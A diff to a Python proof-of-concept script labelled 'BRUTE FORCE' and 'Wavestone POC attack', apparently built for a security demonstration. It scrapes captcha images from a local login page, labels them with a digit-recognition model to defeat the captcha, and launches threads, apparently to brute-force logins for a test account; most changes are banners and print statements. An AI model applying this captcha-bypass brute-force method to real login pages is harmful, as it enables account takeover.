@@ -1,12 +1,11 @@
 print (""" 
-
-██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
-██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
-██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
-██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
-██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
-                                                                            
-                        Wavestone POC attack
+██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
+██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
+██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
+██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
+██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████ 
+                                                                                       
+                                Wavestone POC attack
 """)
 
 import threading
@@ -99,7 +98,9 @@ def main():
     username="test@test.test"
 
     ###################### Captcha ##########################
+    print("Retrieving the captcha image")
     captcha_images = retrieve_captcha_images("http://localhost:3006/auth/login", number_iter=300)
+    print()
     tfds_captcha_images = convert_to_tfds(captcha_images)
     predictions = label_mnist(tfds_captcha_images)
     attacker_dataset = convert_to_tfds(captcha_images, predictions)
@@ -119,11 +120,14 @@ def main():
             t.start()
 
 if __name__ == '__main__':
-    banner = """ 
-                Checking the Server !!        
-[+]█████████████████████████████████████████████████[+]
-"""
-    # print(banner)
-    #retrieve_captcha_images("http://localhost:3006/auth/login", 1)
-    main()
+    try:
+        banner = """ 
+                    Checking the Server !!        
+    [+]█████████████████████████████████████████████████[+]
+    """
+        print(banner)
+        retrieve_captcha_images("http://localhost:3006/auth/login", 1)
+        main()
+    except :
+        print("An error occured during the execution of the script")
 
